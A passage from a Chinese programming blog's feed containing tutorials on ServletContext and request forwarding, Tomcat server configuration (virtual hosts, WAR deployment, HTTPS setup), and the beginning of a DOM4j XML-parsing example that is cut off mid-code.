title="概念"></a>概念</h3><p>ServletContext 对象是所有的 Web 应用都会有的一个单列实例，这个单列实例可以被这个 Web 应用的所有 Servlet 访问并修改内容，我们可以通过这个单列实例完成很多事情。</p><h3 id="获取-Web-应用的初始化参数"><a href="#获取-Web-应用的初始化参数" class="headerlink" title="获取 Web 应用的初始化参数"></a>获取 Web 应用的初始化参数</h3><p>和 ServletConfig 可以访问到 Servlet 的配置信息 <code>&lt;init-param&gt;</code> 一样，对于 Web 应用级别的 ServletContext 对象可以访问 Web 应用的配置信息 <code>&lt;context-param&gt;</code>，这个标签在 web.xml 中和 <code>&lt;servlet&gt;</code> 同级别。我们可以设置一些这样的 Context 属性。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>Tempest<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>Xorex<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>Yukinoshita<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>Yukino<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    ....</span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>获取 ServletContext 除了调用父类的 getServletContext() 以外，还可以调用 ServletConfig 实例的 getServletContext() 方法（因为它内部封装了 ServletContext 的实例，可以调用出来）。然后剩下的步骤和 ServletConfig 读取初始化参数一样了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    ServletContext context = getServletConfig().getServletContext();</span><br><span class="line">    Enumeration&lt;String&gt; iter = context.getInitParameterNames();</span><br><span class="line">    <span class="keyword">while</span>(iter.hasMoreElements()) &#123;</span><br><span class="line">        String name=iter.nextElement();</span><br><span class="line">        System.out.println(name+<span class="string">&quot; : &quot;</span>+context.getInitParameter(name));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Servlet-数据共享"><a href="#Servlet-数据共享" class="headerlink" title="Servlet 数据共享"></a>Servlet 数据共享</h3><p>因为 ServletContext 是所有 Servlet 都能能访问的单列实例，所以就可以利用这个实例才存储一些数据，从而使不同的 Servlet 之间可以共享这些数据。</p><p>共享的方法就是将数据存储到实例的属性值中，使用方法 setAttribute(Name,Value) 和 getAttribute(Name) 来存取数据，实现不同 Servlet 之间的交流。</p><h3 id="获取工程的绝对路径"><a href="#获取工程的绝对路径" class="headerlink" title="获取工程的绝对路径"></a>获取工程的绝对路径</h3><p>使用 ServletContext 的 getReadPath(String) 来返回路径字符串，其中参数填写相对路径即可，比如 <code>&quot;./&quot;</code> ，然后返回项目在电脑中的绝对路径。</p><h2 id="Servlet-请求转发"><a href="#Servlet-请求转发" class="headerlink" title="Servlet 请求转发"></a>Servlet 请求转发</h2><p>请求转发使用的是一个请求调度器 RequestDispatcher 里面的 forward(resquest,response) 可以将信息转发。而获取请求调度器的方法有几种：</p><ol><li><p>通过 ServletContext 的 getRequestDispatcher(String) 获取</p></li><li><p>通过请求 HttpServletRequest 的 getRequestDispatcher(String) 获取</p></li></ol><p>其中参数为目标 Servlet 的映射地址。</p><p>获取 RequestDispatcher 之后，使用 forward() 转发请求即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    RequestDispatcher dispatcher=request.getRequestDispatcher(<span class="string">&quot;/hello-servlet&quot;</span>); <span class="comment">// 把 /New 的请求转发给 /hello-servlet</span></span><br><span class="line">    dispatcher.forward(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Servlet-简介&quot;&gt;&lt;a href=&quot;#Servlet-简介&quot; class=&quot;headerlink&quot; title=&quot;Servlet 简介&quot;&gt;&lt;/a&gt;Servlet 简介&lt;/h2&gt;&lt;p&gt;狭义上的 Servlet 是一种接口，如果开发者想要开发一个动态的 Web </summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Servlet" scheme="https://xorex.space/tags/Servlet/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat 服务器基础</title>
    <link href="https://xorex.space/2021/03/27/9234b0350059/"/>
    <id>https://xorex.space/2021/03/27/9234b0350059/</id>
    <published>2021-03-27T05:06:26.000Z</published>
    <updated>2021-04-01T13:16:05.529Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web-相关概念"><a href="#Web-相关概念" class="headerlink" title="Web 相关概念"></a>Web 相关概念</h2><h3 id="Web-资源"><a href="#Web-资源" class="headerlink" title="Web 资源"></a>Web 资源</h3><p>Web资源一般来说可以分为静态资源和动态资源：</p><ol><li><p>静态资源：供人浏览内容不变的资源，比如 html 页面。</p></li><li><p>动态资源：供人浏览内容会根据不同的情况变化的资源，这些是由应用程序产生的。</p></li></ol><p>静态 Web 开发技术：html</p><p>动态 Web 开发技术：JSP/Serv let ASP PHP</p><h3 id="Web-应用程序"><a href="#Web-应用程序" class="headerlink" title="Web 应用程序"></a>Web 应用程序</h3><p>将一系列的 Web 资源整合在一起，对外提供服务，这就是 Web 应用程序。一个 Web 应用程序由静态资源和动态资源组成：HTML、CSS、JavaScript、JSP、Java、Jar 等等。</p><p>这些 Web 资源开发好之后，如果想要给其他人使用，则需要交给 Web 服务器管理资源的访问。</p><h3 id="静态-动态"><a href="#静态-动态" class="headerlink" title="静态/动态"></a>静态/动态</h3><p>对于静态资源，客户端请求之后，Web 服务器会直接从存储有静态页面的磁盘里面读取文件内容，然后在发送给客户端。客户端的浏览器经过渲染分析，得到了最终的显示效果。</p><p><img src="https://xorex.space/image/200.jpg"></p><p>对于动态资源，客户端请求之后，Web 服务器回将请求交给 Web Container 容器处理，Web Container 经过分析请求之后，会根据请求和数据库里面的记录信息动态的拼接出来页面，然后把内容交给 Web 服务器，Web 服务器再将内容给客户端。</p><p><img src="https://xorex.space/image/201.jpg"></p><h3 id="Web-服务器-容器"><a href="#Web-服务器-容器" class="headerlink" title="Web 服务器 / 容器"></a>Web 服务器 / 容器</h3><p>Web 服务器：Web Server， Web 服务器是指能为发出请求的浏览器提供文档的程序。服务器是一种被动程序，只有浏览器发出请求的时候才会响应。应用层使用的是 HTTP 协议。目前最主流的三个 Web 服务器是 Apache、Nginx 和 IIS。</p><p>Web 容器：Web Container，Web 容器是一种服务程序，是可以部署多个 Web 应用程序的环境，负责调用管理这些 Web 应用程序。</p><p>而我们使用的 Tomcat 既是一个 Web 服务器，也是一个 Web 容器。</p><h2 id="Tomcat-基础"><a href="#Tomcat-基础" class="headerlink" title="Tomcat 基础"></a>Tomcat 基础</h2><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><p><img src="https://xorex.space/image/202.jpg"></p><h3 id="Tomcat-的启动"><a href="#Tomcat-的启动" class="headerlink" title="Tomcat 的启动"></a>Tomcat 的启动</h3><p>方法一：运行 bin 目录下的 <code>start.bat</code></p><p>方法二：CMD 在 bin 目录运行 <code>catalina run</code></p><h3 id="端口修改"><a href="#端口修改" class="headerlink" title="端口修改"></a>端口修改</h3><p>在 config 的 server.xml 配置文件中修改 Connector。当 xml 文件修改之后，就必须重启 Tomcat 服务器，来重新获得配置信息。</p><h3 id="虚拟目录映射和部署"><a href="#虚拟目录映射和部署" class="headerlink" title="虚拟目录映射和部署"></a>虚拟目录映射和部署</h3><ol><li><p>将 Web 应用程序放到 Tomcat 里面的 webapps 文件夹里面，这样启动 Tomcat 之后就可以访问了 Web 应用程序的资源了。</p></li><li><p>在 <code>.\conf\server.xml</code> 中的 <code>&lt;host&gt;&lt;/host&gt;</code> 之间插入路径和文件名之间的映射，但是因为修改了服务器的配置信息，所以需要重启 Tomcat 才可以生效：</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">&quot;/浏览器路径名&quot;</span> <span class="attr">docBase</span>=<span class="string">&quot;Web 应用实际计算机地址&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>在 <code>.\conf\Catalina\localhost</code> 目录下面添加一个 XML 配置文件，文件名任意，里面加入路径和文件位置之间的映射，这种方式可以不用重启服务器：</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">&quot;/浏览器路径名&quot;</span> <span class="attr">docBase</span>=<span class="string">&quot;Web 应用实际计算机地址&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h3><p>在 server.xml 配置文件中，可以看到一条默认的 host 配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Host</span> <span class="attr">name</span>=<span class="string">&quot;localhost&quot;</span>  <span class="attr">appBase</span>=<span class="string">&quot;webapps&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">unpackWARs</span>=<span class="string">&quot;true&quot;</span> <span class="attr">autoDeploy</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这就是我们在访问服务器 <code>http://localhost:8080/</code> 的时候，表示我们访问的主机的名字叫作 localhost ，它的页面服务放在 webapps 文件夹下面。</p><p>又因为 Tomcat 可以设置多个主机，比如 Xorex 主机，Yukino 主机等，来供人们去根据名字访问它们。所以这里的 Host 主机又被称为虚拟主机（因为一台服务器可以设置多个不同名字的主机，这些主机并不是真正的多个服务器构成的，而是由一台主机模拟出来的。）</p><p>那么就可以自己设置一台主机了，在配置信息里加入一条 Host，表示设置主机名称 Xorex。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Host</span> <span class="attr">name</span>=<span class="string">&quot;Xorex&quot;</span> <span class="attr">appBase</span>=<span class="string">&quot;XorexWebSite&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">unpackWARs</span>=<span class="string">&quot;true&quot;</span> <span class="attr">autoDeploy</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后将主机名称和主机的地址绑定起来，也就是域名绑定 IP，这里我们肯定没办法改 DNS 服务器的 域名-IP 绑定，就只能改自己电脑记录的 域名-IP 绑定信息了（浏览器查询域名对应 IP 是优先查看本地保存的，没有再去询问 DNS 根域名服务器），在 <code>C:\Windows\System32\drivers\etc</code> 这里面的 hosts 文件增加 域名-IP 绑定信息：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># localhost name resolution is handled within DNS itself.</span><br><span class="line">#   127.0.0.1       localhost</span><br><span class="line">#   ::1             localhost</span><br><span class="line">    127.0.0.1       Xorex</span><br></pre></td></tr></table></figure><p>这样就可以通过 <code>http://Xorex:8080/</code> 这个网址解析到 <code>http://127.0.0.1:8080</code> 服务器（也就是本机）的 Xorex 虚拟主机里面（因为 <code>http://Xorex:8080/</code> 指定访问主机名为 Xorex， <code>http://localhost:8080</code> 指定访问主机名为 localhost。）</p><h3 id="Java-Web-应用文件结构"><a href="#Java-Web-应用文件结构" class="headerlink" title="Java Web 应用文件结构"></a>Java Web 应用文件结构</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">JavaWeb文件夹</span><br><span class="line">    |</span><br><span class="line">    | --- HTML JSP CSS JS 可以被客户端直接访问的资源</span><br><span class="line">    |</span><br><span class="line">    | --- WEB-INF 目录</span><br><span class="line">    |           |</span><br><span class="line">                | --- class 目录 （存放 Java 代码）</span><br><span class="line">                |</span><br><span class="line">                | --- lib （Java 运行所需要的 Jar 包）</span><br><span class="line">                |</span><br><span class="line">                | --- web.xml （Web应用的配置文件）</span><br></pre></td></tr></table></figure><p>对于用户来说，除了 WEB-INF 以外的目录的资源都可以随意访问获取，但是对于 WEB-INF 里面的，只有服务器自己才能访问调用。</p><h3 id="打包-Web-应用程序"><a href="#打包-Web-应用程序" class="headerlink" title="打包 Web 应用程序"></a>打包 Web 应用程序</h3><p>当我们按照上面的文件结构开发好了一个 Web 应用程序之后，我们就可以把这个 Web 应用程序打包了。使用 <code>jar -cf WebPackageName.war WebDirName</code> 就可以将 WebDirName 文件夹里面的 Web 应用程序打包为 WebPackageName.war 了。</p><p>其中 -c 表示 create 创建 war 包，-f 表示 file 命名 war 文件名字。</p><p>拿到 war 包之后可以直接放到对应主机的 appBase 文件夹下面，当 Tomcat 服务器启动的时候，会自动解压 war 包，并运行其服务。</p><h3 id="Tomcat-工作原理"><a href="#Tomcat-工作原理" class="headerlink" title="Tomcat 工作原理"></a>Tomcat 工作原理</h3><p>先看看 Tomcat 的结构图：</p><p><img src="https://xorex.space/image/204.jpg"></p><p>当 Tomcat 的服务器启动以后，会首先读取 server.xml 文件来启动一个 Server 服务器，Server 又会启动一个 Service 服务，里面有多个 Connector 来等待和客户端进行连接，不同的 Connector 会连接不同的请求协议。Connector 接收到客户端发送过来的请求之后，会转移给 Engine，由 Engine 分析此请求所访问的 Host 虚拟主机，并将请求转发给对应的 Host 虚拟主机，然后经过解析返回所请求的 Web 应用 Context。</p><p>比如 server.xml 里面就有各种的配置信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Server</span> <span class="attr">port</span>=<span class="string">&quot;8005&quot;</span> <span class="attr">shutdown</span>=<span class="string">&quot;SHUTDOWN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Service</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8080&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;HTTP/1.1&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">connectionTimeout</span>=<span class="string">&quot;20000&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Engine</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span> <span class="attr">defaultHost</span>=<span class="string">&quot;localhost&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Host</span> <span class="attr">name</span>=<span class="string">&quot;localhost&quot;</span>  <span class="attr">appBase</span>=<span class="string">&quot;webapps&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">unpackWARs</span>=<span class="string">&quot;true&quot;</span> <span class="attr">autoDeploy</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;logs&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">prefix</span>=<span class="string">&quot;localhost_access_log&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.txt&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">pattern</span>=<span class="string">&quot;%h %l %u %t <span class="symbol">&amp;quot;</span>%r<span class="symbol">&amp;quot;</span> %s %b&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Host</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Engine</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Server</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Https-连接"><a href="#Https-连接" class="headerlink" title="Https 连接"></a>Https 连接</h3><p>Https 连接是加密连接，首先服务器会发送给客户端一份公钥，然后客户端自己持有私钥。通过非对称加密进行密钥交换（交换过程即使被监听也无法被截获：<a href="https://www.xmind.net/m/yVNPMU/">交换密钥</a>），使用非对称加密 + 证书是为了防止有人伪造服务器。然后客户端就能从服务器手里安全的拿到数据的加密密钥，从而保证整个传输过程中的数据安全。</p><p>那么如何给自己的服务器添加证书呢，使用命令：<code>keytool -genkey -alias tomcat -keyalg RSA</code> 然后设置一个密码，就会在 User 文件夹下面生成一个 <code>.keystore</code> 文件，这个就是证书了，复制到 Tomcat 的 <code>conf/.keystore</code> 里面，然后在 server.xml 里面添加一个使用 Https 连接的 Connector ：</p><p>注意 KeystorePass 属性这里填写你生成证书的时候设置的密码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8443&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;org.apache.coyote.http11.Http11Protocol&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">maxThreads</span>=<span class="string">&quot;150&quot;</span> <span class="attr">SSLEnabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">scheme</span>=<span class="string">&quot;https&quot;</span> <span class="attr">secure</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">clientAuth</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sslProtocol</span>=<span class="string">&quot;TLS&quot;</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">keystoreFile</span>=<span class="string">&quot;conf/.keystore&quot;</span> <span class="attr">keystorePass</span>=<span class="string">&quot;Password&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问的时候就可以用 <code>https://localhost:8443</code> 进行访问了因为浏览器没有我们的 CA 证书，所以会显示不安全。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Web-相关概念&quot;&gt;&lt;a href=&quot;#Web-相关概念&quot; class=&quot;headerlink&quot; title=&quot;Web 相关概念&quot;&gt;&lt;/a&gt;Web 相关概念&lt;/h2&gt;&lt;h3 id=&quot;Web-资源&quot;&gt;&lt;a href=&quot;#Web-资源&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Tomcat" scheme="https://xorex.space/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>DOM4j 解析 XML</title>
    <link href="https://xorex.space/2021/03/26/0287d2a0e598/"/>
    <id>https://xorex.space/2021/03/26/0287d2a0e598/</id>
    <published>2021-03-26T03:06:33.000Z</published>
    <updated>2021-04-02T12:00:19.775Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用-DOM4j"><a href="#使用-DOM4j" class="headerlink" title="使用 DOM4j"></a>使用 DOM4j</h2><h3 id="XML-文件"><a href="#XML-文件" class="headerlink" title="XML 文件"></a>XML 文件</h3><p>首先拥有 xml 文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">breakfast_menu</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Belgian Waffles<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">price</span>&gt;</span>$5.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Two of our famous Belgian Waffles with plenty of real maple syrup<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">calories</span>&gt;</span>650<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Strawberry Belgian Waffles<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">price</span>&gt;</span>$7.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Light Belgian waffles covered with strawberries and whipped cream<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">calories</span>&gt;</span>900<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Berry-Berry Belgian Waffles<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">price</span>&gt;</span>$8.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Light Belgian waffles covered with an assortment of fresh berries and whipped cream<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">calories</span>&gt;</span>900<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>French Toast<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">price</span>&gt;</span>$4.50<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Thick slices made from our homemade sourdough bread<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">calories</span>&gt;</span>600<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Homestyle Breakfast<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">price</span>&gt;</span>$6.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Two eggs, bacon or sausage, toast, and our ever-popular hash browns<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">calories</span>&gt;</span>950<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">food</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">breakfast_menu</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="保存-Food-类"><a href="#保存-Food-类" class="headerlink" title="保存 Food 类"></a>保存 Food 类</h3><p>然后尝试解析这个 XML 文件，将里面的信息保存到一个类中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Food</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String Name;</span><br><span class="line">    <span class="keyword">private</span> String Price;</span><br><span class="line">    <span class="keyword">private</span> String Description;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> Calories;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Food</span><span class="params">(String name, String price, String description, <span class="keyword">int</span> calories)</span> </span>&#123;</span><br><span class="line">        Name = name;</span><br><span class="line">        Price = price;</span><br><span class="line">        Description = description;</span><br><span class="line">        Calories = calories;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPrice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Description;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCalories</span><span 